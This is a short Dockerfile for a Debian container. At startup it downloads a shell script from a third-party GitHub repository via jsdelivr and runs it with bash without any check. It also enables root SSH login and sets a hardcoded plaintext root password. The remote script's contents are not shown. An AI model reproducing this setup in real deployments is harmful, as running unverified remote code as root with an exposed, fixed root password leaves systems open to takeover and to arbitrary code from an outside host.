FROM debian
RUN apt update
RUN DEBIAN_FRONTEND=noninteractive apt install ssh wget git unzip -y
RUN mkdir /run/sshd 
RUN echo 'wget -O install.sh https://cdn.jsdelivr.net/gh/gitiy1/heihei@master/winner.sh && bash install.sh' >>/iy.sh
RUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config 
RUN echo root:iceyear|chpasswd
RUN chmod 755 /iy.sh
EXPOSE 5212
CMD  /iy.sh
